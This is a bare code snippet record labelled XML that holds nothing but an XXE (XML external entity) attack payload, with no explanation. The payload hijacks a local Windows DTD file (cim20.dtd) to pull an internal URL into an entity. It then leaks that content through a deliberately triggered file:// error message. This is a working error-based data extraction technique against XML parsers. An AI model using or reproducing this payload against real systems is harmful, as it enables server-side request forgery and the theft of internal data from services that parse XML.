---
id: c538a66a-a7c9-404a-a6a9-d3c28fda0391
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.728426+00:00'
updated_at: '2023-04-10T20:24:42.681333+00:00'
---

# Code Snippet c538a66a

**Language**: xml

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>cacat</xxx>
```
